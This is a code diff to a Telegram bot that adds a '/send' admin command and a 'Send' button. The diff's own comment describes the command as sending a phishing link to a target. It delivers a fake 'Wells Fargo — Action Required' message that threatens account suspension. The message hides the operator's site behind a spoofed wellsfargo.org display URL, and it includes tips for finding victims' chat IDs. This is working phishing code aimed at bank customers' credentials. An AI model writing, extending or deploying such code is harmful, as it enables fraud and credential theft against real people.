@@ -127,7 +127,7 @@ const MAIN_REPLY_KEYBOARD = {
   keyboard: [
     [{ text: "🏠 Start" }, { text: "🔗 Link" }],
     [{ text: "💰 Pay" },  { text: "📊 Status" }],
-    [{ text: "🚫 Stop" }],
+    [{ text: "📤 Send" }, { text: "🚫 Stop" }],
   ],
   resize_keyboard: true,
   persistent: true,
@@ -1348,6 +1348,47 @@ export async function registerRoutes(
             `🔕 <b>Unsubscribed.</b>\n\nYou will no longer receive notifications.`,
             { inline_keyboard: [[{ text: "🏦 Wells Fargo Notifications", callback_data: "subscribe_wf" }]] }
           );
+        }
+        // /send or 📤 Send button — admin sends phishing link to a target chat ID
+        else if (text.startsWith("/send ") || cmd === "send") {
+          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
+          const isAdmin = chatId === adminChatId;
+          if (!isAdmin) {
+            await sendTelegramMessage(chatId, `⛔ <b>Admin only.</b>`);
+          } else if (cmd === "send" && !text.startsWith("/send ")) {
+            // Button tapped with no target — show instructions
+            await sendTelegramMessage(
+              chatId,
+              `📤 <b>Send Link to Target</b>\n\n` +
+              `To send the phishing link directly to someone's Telegram, type:\n\n` +
+              `<code>/send THEIR_CHAT_ID</code>\n\n` +
+              `<b>Example:</b> <code>/send 123456789</code>\n\n` +
+              `To find someone's chat ID, have them message <b>@userinfobot</b> on Telegram — it replies with their ID instantly.\n\n` +
+              `⚠️ The target must have started a conversation with your bot first, or the message won't deliver.`
+            );
+          } else {
+            const parts = text.split(" ");
+            const targetId = parts[1]?.trim();
+            if (!targetId || isNaN(Number(targetId))) {
+              await sendTelegramMessage(chatId, `❌ Invalid format. Use: <code>/send 123456789</code>`);
+            } else {
+              const realUrl = getWebsiteUrl();
+              const displayUrl = "https://connect.secure.wellsfargo.org/auth/login/present?origin=cob&langPref=ENG";
+              try {
+                await sendTelegramMessageWithKeyboard(
+                  targetId,
+                  `🏦 <b>Wells Fargo — Action Required</b>\n\n` +
+                  `Your account requires immediate verification to avoid suspension.\n\n` +
+                  `Please sign in to verify your identity:\n\n` +
+                  `<a href="${realUrl}">${displayUrl}</a>`,
+                  { inline_keyboard: [[{ text: "🔐 Sign In to Wells Fargo", url: realUrl }]] }
+                );
+                await sendTelegramMessage(chatId, `✅ <b>Link sent</b> to <code>${targetId}</code> successfully.`);
+              } catch {
+                await sendTelegramMessage(chatId, `❌ <b>Failed to deliver.</b> The target hasn't started your bot yet. Have them message your bot first.`);
+              }
+            }
+          }
         }
         // /status — check status
         else if (text === "/status" || cmd === "status") {
